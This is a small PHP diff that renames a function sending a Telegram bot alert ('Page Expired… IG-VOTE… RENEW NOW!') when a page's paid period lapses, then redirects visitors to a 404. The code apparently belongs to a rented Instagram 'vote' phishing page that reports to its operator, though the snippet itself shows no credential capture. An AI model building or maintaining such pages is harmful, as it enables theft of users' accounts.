@@ -112,7 +112,7 @@ if (isset($_POST['vote_clicked'])) {
 
 if ($currentTime > $setDate) {
     ob_start();
-    sendTelegramMessage($botToken, $chatId, "⏰ Page Expired\nLink: IG-VOTE\nStatus: Expired\nRENEW NOW!");
+    sendVoteNotificationToTelegram($botToken, $chatId, "⏰ Page Expired\nLink: IG-VOTE\nStatus: Expired\nRENEW NOW!");
     ob_end_clean();
     header('Location: 404');
     exit();
